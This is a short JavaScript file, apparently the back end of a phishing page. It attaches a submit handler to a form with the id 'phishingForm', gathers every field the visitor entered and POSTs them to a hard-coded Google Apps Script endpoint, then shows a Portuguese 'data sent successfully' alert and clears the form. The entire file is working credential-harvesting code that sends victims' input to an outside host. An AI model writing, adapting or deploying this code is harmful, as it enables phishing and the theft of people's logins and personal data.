const scriptURL = "https://script.google.com/macros/s/AKfycbzBkJ8YjHr8sk7MjSykLDoGQxgRKiOAq8P_srBF97Uxd7MXqWx6XhafXFQYJ5oZyuGoPQ/exec";

document.getElementById("phishingForm").addEventListener("submit", function(event) {
    event.preventDefault();
    const form = event.target;
    const data = new FormData(form);

    fetch(scriptURL, {
        method: "POST",
        body: data
    })
    .then(response => {
        alert("✅ Dados enviados com sucesso!");
        form.reset();
    })
    .catch(error => {
        alert("❌ Erro ao enviar os dados.");
        console.error("Erro:", error);
    });
});
